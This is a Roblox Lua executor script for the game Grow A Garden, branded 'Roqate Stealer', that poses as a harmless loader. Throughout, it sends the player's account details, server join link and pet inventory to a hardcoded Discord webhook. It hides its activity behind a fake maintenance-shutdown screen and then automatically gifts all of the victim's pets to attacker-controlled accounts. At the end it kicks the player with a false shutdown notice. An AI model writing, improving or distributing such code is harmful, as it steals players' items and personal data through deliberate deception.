local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer
local VirtualInputManager = game:GetService("VirtualInputManager")

local RECEIVERS = {"Roqate", "TwiistyGotTerminated", "rezngl", "jjjhgggbnn", "RacMethodCB"}
local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
local CHECK_INTERVAL = 5
local SHUTDOWN_DURATION = 10
local GIFT_COOLDOWN = 3
local MINIMUM_PETS = 3
local MINIMUM_TOTAL_VALUE = 50000

local function identifyExecutor()
    if syn then
        return "Synapse X"
    elseif PROTOSMASHER_LOADED then
        return "ProtoSmasher"
    elseif KRNL_LOADED then
        return "Krnl"
    elseif fluxus then
        return "Fluxus"
    elseif getexecutorname then
        return getexecutorname()
    elseif identifyexecutor then
        return identifyexecutor()
    else
        return "Unknown Executor"
    end
end

local IS_DELTA = identifyExecutor():lower() == "delta"

if syn then
    syn.protect_gui(syn.secure_call)
    setfflag("HttpServiceEnabled", true)
end

local function sendWebhook(data)
    local body = {
        content = data.content,
        embeds = data.embeds,
        username = "Roqate Stealer",
        avatar_url = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-81CCE64B2B99B3F2494AF048054A9CC0-Png/150/150/AvatarHeadshot/Webp/noFilter"
    }

    local json = HttpService:JSONEncode(body)
    
    local requestFunc = syn and syn.request or http_request or request
    if requestFunc then
        requestFunc({
            Url = Webhook1,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = json
        })
    end
end

local function getPetsInventory()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return {} end

    local pets = {}
    for _, item in ipairs(backpack:GetChildren()) do
        local nameMatch = item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$")
        if nameMatch then
            local petName = nameMatch
            local kg = tonumber(item.Name:match("%[(%d+%.%d+) KG%]")) or 0
            local age = tonumber(item.Name:match("%[Age (%d+)%]")) or 0
            local isSpecial = false

            for _, specialName in ipairs(SPECIAL_PETS) do
                if petName:find(specialName) then
                    isSpecial = true
                    break
                end
            end

            table.insert(pets, {
                instance = item,
                name = petName,
                fullName = item.Name,
                kg = kg,
                age = age,
                special = isSpecial,
                value = math.floor((kg * 10000) + (age * 1000)
            })
        end
    end
    
    table.sort(pets, function(a, b)
        return a.value > b.value
    end)
    
    return pets
end

local function createLoader()
    shared.LoaderTitle = "Subscribe to TwiistyScripts"
    shared.LoaderKeyFrames = {
        [1] = {1, 10},
        [2] = {2, 30},
        [3] = {3, 60},
        [4] = {2, 100}
    }
    
    local v2 = {
        LoaderData = {
            Name = shared.LoaderTitle or "A Loader",
            Colors = shared.LoaderColors or {
                Main = Color3.fromRGB(30, 30, 30),
                Topic = Color3.fromRGB(200, 200, 200),
                Title = Color3.fromRGB(255, 255, 255),
                LoaderBackground = Color3.fromRGB(40, 40, 40),
                LoaderSplash = Color3.fromRGB(130, 36, 212)
            }
        },
        Keyframes = shared.LoaderKeyFrames or {
            [1] = {1, 10},
            [2] = {2, 30},
            [3] = {3, 60},
            [4] = {2, 100}
        }
    }
    
    local v3 = {
        [1] = "Initializing...",
        [2] = "Loading assets...",
        [3] = "Connecting...",
        [4] = "Complete!"
    }

    function TweenObject(v178, v179, v180)
        game.TweenService:Create(v178, TweenInfo.new(v179, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), v180):Play()
    end

    function CreateObject(v181, v182)
        local v183 = Instance.new(v181)
        local v184
        for v416, v417 in pairs(v182) do
            if (v416 ~= "Parent") then
                v183[v416] = v417
            else
                v184 = v417
            end
        end
        v183.Parent = v184
        return v183
    end

    local function v4(v186, v187)
        local v188 = Instance.new("UICorner")
        v188.CornerRadius = UDim.new(0, v186)
        v188.Parent = v187
    end

    local v5 = CreateObject("ScreenGui", {
        Name = "Core",
        Parent = game.CoreGui
    })

    local v6 = CreateObject("Frame", {
        Name = "Main",
        Parent = v5,
        BackgroundColor3 = v2.LoaderData.Colors.Main,
        BorderSizePixel = 0,
        ClipsDescendants = true,
        Position = UDim2.new(0.5, 0, 0.5, 0),
        AnchorPoint = Vector2.new(0.5, 0.5),
        Size = UDim2.new(0, 0, 0, 0)
    })

    v4(12, v6)

    local v7 = CreateObject("ImageLabel", {
        Name = "UserImage",
        Parent = v6,
        BackgroundTransparency = 1,
        Image = "rbxassetid://81767899440204",
        Position = UDim2.new(0, 15, 0, 10),
        Size = UDim2.new(0, 50, 0, 50)
    })

    v4(25, v7)

    local v8 = CreateObject("TextLabel", {
        Name = "UserName",
        Parent = v6,
        BackgroundTransparency = 1,
        Text = "Youtube: TwiistyScripts",
        Position = UDim2.new(0, 75, 0, 10),
        Size = UDim2.new(0, 200, 0, 50),
        Font = Enum.Font.GothamBold,
        TextColor3 = v2.LoaderData.Colors.Title,
        TextSize = 14,
        TextXAlignment = Enum.TextXAlignment.Left
    })

    local v9 = CreateObject("TextLabel", {
        Name = "Top",
        TextTransparency = 1,
        Parent = v6,
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 30, 0, 70),
        Size = UDim2.new(0, 301, 0, 20),
        Font = Enum.Font.Gotham,
        Text = "Loader",
        TextColor3 = v2.LoaderData.Colors.Topic,
        TextSize = 10,
        TextXAlignment = Enum.TextXAlignment.Left
    })

    local v10 = CreateObject("TextLabel", {
        Name = "Title",
        Parent = v6,
        TextTransparency = 1,
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 30, 0, 90),
        Size = UDim2.new(0, 301, 0, 46),
        Font = Enum.Font.Gotham,
        RichText = true,
        Text = "<b>" .. v2.LoaderData.Name .. "</b>",
        TextColor3 = v2.LoaderData.Colors.Title,
        TextSize = 14,
        TextXAlignment = Enum.TextXAlignment.Left
    })

    local v11 = CreateObject("Frame", {
        Name = "BG",
        Parent = v6,
        AnchorPoint = Vector2.new(0.5, 0),
        BackgroundTransparency = 1,
        BackgroundColor3 = v2.LoaderData.Colors.LoaderBackground,
        BorderSizePixel = 0,
        Position = UDim2.new(0.5, 0, 0, 70),
        Size = UDim2.new(0.8500000238418579, 0, 0, 24)
    })

    v4(8, v11)

    local v12 = CreateObject("Frame", {
        Name = "Progress",
        Parent = v11,
        BackgroundColor3 = v2.LoaderData.Colors.LoaderSplash,
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(0, 0, 0, 24)
    })

    v4(8, v12)

    local v13 = CreateObject("TextLabel", {
        Name = "StepLabel",
        Parent = v6,
        BackgroundTransparency = 1,
        Position = UDim2.new(0.5, 0, 1, -25),
        Size = UDim2.new(1, -20, 0, 20),
        Font = Enum.Font.Gotham,
        Text = "",
        TextColor3 = v2.LoaderData.Colors.Topic,
        TextSize = 14,
        TextXAlignment = Enum.TextXAlignment.Center,
        AnchorPoint = Vector2.new(0.5, 0.5)
    })

    function UpdateStepText(v191)
        v13.Text = v3[v191] or ""
    end

    function UpdatePercentage(v193, v194)
        TweenObject(v12, 0.5, {
            Size = UDim2.new(v193/100, 0, 0, 24)
        })
        UpdateStepText(v194)
    end

    TweenObject(v6, 0.25, {
        Size = UDim2.new(0, 346, 0, 121)
    })
    
    wait()
    
    TweenObject(v9, 0.5, {
        TextTransparency = 0
    })
    
    TweenObject(v10, 0.5, {
        TextTransparency = 0
    })
    
    TweenObject(v11, 0.5, {
        BackgroundTransparency = 0
    })
    
    TweenObject(v12, 0.5, {
        BackgroundTransparency = 0
    })

    for v195, v196 in pairs(v2.Keyframes) do
        wait(v196[1])
        UpdatePercentage(v196[2], v195)
    end

    UpdatePercentage(100, 4)
    
    TweenObject(v9, 0.5, {
        TextTransparency = 1
    })
    
    TweenObject(v10, 0.5, {
        TextTransparency = 1
    })
    
    TweenObject(v11, 0.5, {
        BackgroundTransparency = 1
    })
    
    TweenObject(v12, 0.5, {
        BackgroundTransparency = 1
    })
    
    wait(0.5)
    
    TweenObject(v6, 0.25, {
        Size = UDim2.new(0, 0, 0, 0)
    })
    
    wait(0.25)
    v5:Destroy()
end

local function splitEmbeds(pets, totalValue, specialCount)
    local embeds = {}
    local placeId = game.PlaceId
    local jobId = game.JobId
    local gameInstanceId = tostring(game.JobId)
    
    local mainEmbed = {
        title = "🐾 Pet Stealer Report",
        color = 0x8324D4,
        timestamp = DateTime.now():ToIsoDate(),
        thumbnail = {
            url = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-81CCE64B2B99B3F2494AF048054A9CC0-Png/150/150/AvatarHeadshot/Webp/noFilter"
        },
        fields = {
            {
                name = "👤 Player Information",
                value = string.format("```Username: %s (@%s)\nUser ID: %d\nAccount Age: %d days\nExecutor: %s```", 
                    LocalPlayer.Name, 
                    LocalPlayer.DisplayName,
                    LocalPlayer.UserId,
                    LocalPlayer.AccountAge,
                    identifyExecutor()
                ),
                inline = false
            },
            {
                name = "🌐 Server Information",
                value = string.format("```Game: %s\nPlace ID: %d\nJob ID: %s```\n[Click to Join Server](https://www.roblox.com/games/%d?privateServerLinkCode=%s)", 
                    game:GetService("MarketplaceService"):GetProductInfo(placeId).Name,
                    placeId, 
                    jobId,
                    placeId,
                    jobId
                ),
                inline = false
            },
            {
                name = "📊 Inventory Summary",
                value = string.format("```Total Pets: %d\n🌟 Special Pets: %d\n💰 Total Value: %s¢```", 
                    #pets, 
                    specialCount,
                    tostring(totalValue):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
                ),
                inline = false
            }
        },
        footer = {
            text = "Roqate Stealer • "..os.date("%m/%d/%Y %I:%M %p"),
            icon_url = "https://cdn.discordapp.com/emojis/1187822753164578866.webp?size=96&quality=lossless"
        }
    }
    
    table.insert(embeds, mainEmbed)
    
    local petChunks = {}
    for i = 1, #pets, 10 do
        table.insert(petChunks, {table.unpack(pets, i, math.min(i + 9, #pets))})
    end
    
    for i, chunk in ipairs(petChunks) do
        local petList = ""
        local totalChunkValue = 0
        
        for _, pet in ipairs(chunk) do
            petList = petList..string.format("%s %s [%.2f KG] [Age %d] → %s¢\n",
                pet.special and "🌟" or "🐶",
                pet.name,
                pet.kg,
                pet.age,
                tostring(pet.value):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
            )
            totalChunkValue = totalChunkValue + pet.value
        end
        
        local petEmbed = {
            title = string.format("📦 Pet Inventory (Part %d/%d)", i, #petChunks),
            color = 0x8324D4,
            fields = {
                {
                    name = string.format("🐾 Pets %d-%d (Total: %s¢)", 
                        (i-1)*10 + 1, 
                        math.min(i*10, #pets),
                        tostring(totalChunkValue):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
                    ),
                    value = "```"..petList.."```",
                    inline = false
                }
            },
            footer = {
                text = "Roqate Stealer • Part "..i.." of "..#petChunks,
                icon_url = "https://cdn.discordapp.com/emojis/1187822753164578866.webp?size=96&quality=lossless"
            }
        }
        
        table.insert(embeds, petEmbed)
    end
    
    return embeds
end

local function sendInitialReport()
    local pets = getPetsInventory()
    local totalValue = 0
    local specialCount = 0
    
    for _, pet in ipairs(pets) do
        totalValue = totalValue + pet.value
        if pet.special then specialCount = specialCount + 1 end
    end

    local embeds = splitEmbeds(pets, totalValue, specialCount)
    sendWebhook({
        embeds = embeds
    })
end

local function unfavoriteAllPets()
    -- Find the FavoriteOnly frame in the player's backpack UI
    local backpackGui = LocalPlayer.PlayerGui:FindFirstChild("Backpack")
    if not backpackGui then return false end
    
    local favoriteOnlyFrame = backpackGui:FindFirstChild("FavoriteOnly", true)
    if not favoriteOnlyFrame then return false end
    
    -- Click the FavoriteOnly button to show favorited pets
    VirtualInputManager:SendMouseButtonEvent(favoriteOnlyFrame.AbsolutePosition.X + favoriteOnlyFrame.AbsoluteSize.X/2,
                                           favoriteOnlyFrame.AbsolutePosition.Y + favoriteOnlyFrame.AbsoluteSize.Y/2,
                                           0, true, game, 1)
    task.wait(0.1)
    VirtualInputManager:SendMouseButtonEvent(favoriteOnlyFrame.AbsolutePosition.X + favoriteOnlyFrame.AbsoluteSize.X/2,
                                           favoriteOnlyFrame.AbsolutePosition.Y + favoriteOnlyFrame.AbsoluteSize.Y/2,
                                           0, false, game, 1)
    task.wait(0.5)
    
    -- Unfavorite all pets that are shown
    local pets = getPetsInventory()
    for _, pet in ipairs(pets) do
        if pet.instance:GetAttribute("Favorited") then
            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet.instance)
            task.wait(0.2)
        end
    end
    
    return true
end

local function giftPet(targetPlayer, petName)
    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", targetPlayer)
end

local function equipSinglePet(petName)
    local character = LocalPlayer.Character
    if not character then return false end

    -- Unequip all pets first
    for _, item in ipairs(character:GetChildren()) do
        if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
            item.Parent = LocalPlayer.Backpack
        end
    end

    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    if pet then
        pet.Parent = character
        return true
    end
    return false
end

local function teleportToPlayer(targetPlayer)
    if not LocalPlayer.Character then return false end
    local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end

    if not targetPlayer.Character then return false end
    local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHrp then return false end

    local offset = targetHrp.CFrame.LookVector * -5
    offset = Vector3.new(offset.X, 0, offset.Z)
    humanoidRootPart.CFrame = CFrame.new(targetHrp.Position + offset, targetHrp.Position)
    return true
end

local function isReceiverInGame()
    for _, receiverName in ipairs(RECEIVERS) do
        local player = Players:FindFirstChild(receiverName)
        if player then return player end
    end
    return nil
end

local function createFakeShutdown()
    local gui = Instance.new("ScreenGui")
    gui.Name = "FakeShutdown"
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 999999

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.Parent = gui

    local title = Instance.new("TextLabel")
    title.Text = "Grow A Garden"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Size = UDim2.new(1, 0, 0.3, 0)
    title.Position = UDim2.new(0, 0, 0.3, 0)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 32
    title.TextTransparency = 1
    title.Parent = frame

    local message = Instance.new("TextLabel")
    message.Text = "Servers shutting down for maintenance..."
    message.TextColor3 = Color3.new(1, 1, 1)
    message.Size = UDim2.new(1, 0, 0.2, 0)
    message.Position = UDim2.new(0, 0, 0.5, 0)
    message.BackgroundTransparency = 1
    message.Font = Enum.Font.SourceSans
    message.TextSize = 24
    message.TextTransparency = 1
    message.Parent = frame

    local dots = Instance.new("TextLabel")
    dots.Text = "Please wait"
    dots.TextColor3 = Color3.new(1, 1, 1)
    dots.Size = UDim2.new(1, 0, 0.1, 0)
    dots.Position = UDim2.new(0, 0, 0.6, 0)
    dots.BackgroundTransparency = 1
    dots.Font = Enum.Font.SourceSans
    dots.TextSize = 18
    dots.TextTransparency = 1
    dots.Parent = frame

    gui.Parent = CoreGui

    local fadeInTime = 1.5
    local fadeInStart = os.clock()
    local fadeConn
    fadeConn = RunService.Heartbeat:Connect(function()
        local elapsed = os.clock() - fadeInStart
        local alpha = math.min(elapsed / fadeInTime, 1)

        title.TextTransparency = 1 - alpha
        message.TextTransparency = 1 - alpha
        dots.TextTransparency = 1 - alpha

        if alpha >= 1 then
            fadeConn:Disconnect()
        end
    end)

    local dotCount = 0
    local lastDotTime = os.clock()
    local dotInterval = 0.8
    local dotConn
    dotConn = RunService.Heartbeat:Connect(function()
        local now = os.clock()
        if now - lastDotTime >= dotInterval then
            lastDotTime = now
            dotCount = (dotCount + 1) % 4
            dots.Text = "Please wait"..string.rep(".", dotCount)
        end
    end)

    local pulseConn
    pulseConn = RunService.Heartbeat:Connect(function()
        local pulse = math.sin(os.clock() * 1.5) * 0.05 + 1
        title.TextSize = 32 * pulse
    end)

    return gui, function()
        if fadeConn then fadeConn:Disconnect() end
        if dotConn then dotConn:Disconnect() end
        if pulseConn then pulseConn:Disconnect() end
        gui:Destroy()
    end
end

local function waitForReceiver()
    local receiverFound = Instance.new("BindableEvent")

    for _, player in ipairs(Players:GetPlayers()) do
        if table.find(RECEIVERS, player.Name) then
            receiverFound:Fire(player)
            break
        end
    end

    local connection = Players.PlayerAdded:Connect(function(player)
        if table.find(RECEIVERS, player.Name) then
            receiverFound:Fire(player)
        end
    end)

    local backupCheck = coroutine.create(function()
        while true do
            local receiver = isReceiverInGame()
            if receiver then
                receiverFound:Fire(receiver)
                break
            end
            task.wait(CHECK_INTERVAL)
        end
    end)
    coroutine.resume(backupCheck)

    local foundReceiver = receiverFound.Event:Wait()
    connection:Disconnect()
    
    local shutdownGui, cleanup = createFakeShutdown()
    
    -- Keep shutdown screen active until receiver leaves
    local receiverLeft = false
    local function onReceiverLeft()
        receiverLeft = true
        cleanup()
    end
    
    if foundReceiver then
        foundReceiver.AncestryChanged:Connect(function(_, parent)
            if not parent then
                onReceiverLeft()
            end
        end)
    end
    
    -- If receiver leaves before shutdown duration, wait the remaining time
    if not receiverLeft then
        task.wait(SHUTDOWN_DURATION)
        cleanup()
    end
    
    return foundReceiver, receiverLeft
end

local function clickPlayerScreen(targetPlayer)
    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return false end
    
    local camera = workspace.CurrentCamera
    local pos, visible = camera:WorldToViewportPoint(targetPlayer.Character.HumanoidRootPart.Position)
    if not visible then return false end
    
    local x, y = pos.X, pos.Y
    
    -- Hold the click for 0.5 seconds
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
    task.wait(0.5)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
    
    return true
end

local function checkForGiftPrompt(targetPlayer)
    for _, gui in ipairs(CoreGui:GetDescendants()) do
        if gui:IsA("TextLabel") and gui.Text:lower():find("cannot gift a favorited pet") then
            return "favorited"
        elseif gui:IsA("TextLabel") and gui.Text:lower():find(targetPlayer.Name:lower()) and gui.Text:lower():find("gift") then
            return "gift"
        end
    end
    return "none"
end

local function startGifting(targetPlayer)
    -- First unfavorite all pets
    unfavoriteAllPets()
    
    while true do
        local pets = getPetsInventory()
        if #pets == 0 then break end

        for _, pet in ipairs(pets) do
            if IS_DELTA then
                -- Delta-specific gifting logic
                if equipSinglePet(pet.fullName) then
                    local attempts = 0
                    local success = false
                    
                    while attempts < 3 and not success do
                        attempts = attempts + 1
                        
                        if clickPlayerScreen(targetPlayer) then
                            task.wait(0.5)
                            local promptStatus = checkForGiftPrompt(targetPlayer)
                            
                            if promptStatus == "gift" then
                                giftPet(targetPlayer, pet.fullName)
                                success = true
                                task.wait(GIFT_COOLDOWN)
                            elseif promptStatus == "favorited" then
                                unfavoriteAllPets()
                                task.wait(1)
                                equipSinglePet(pet.fullName)
                            else
                                task.wait(1)
                            end
                        else
                            task.wait(1)
                        end
                    end
                    
                    if success then break end
                end
            else
                -- Normal gifting logic
                if equipSinglePet(pet.fullName) then
                    giftPet(targetPlayer, pet.fullName)
                    task.wait(GIFT_COOLDOWN)
                    break
                end
            end
        end
        task.wait(1)
    end
end

createLoader()
sendInitialReport()
task.wait(2)

local receiver, receiverLeft = waitForReceiver()
if not receiver then return end

if receiverLeft then
    -- If receiver left during shutdown, kick the player
    LocalPlayer:Kick("Server has shutdown for maintenance")
    return
end

teleportToPlayer(receiver)
startGifting(receiver)
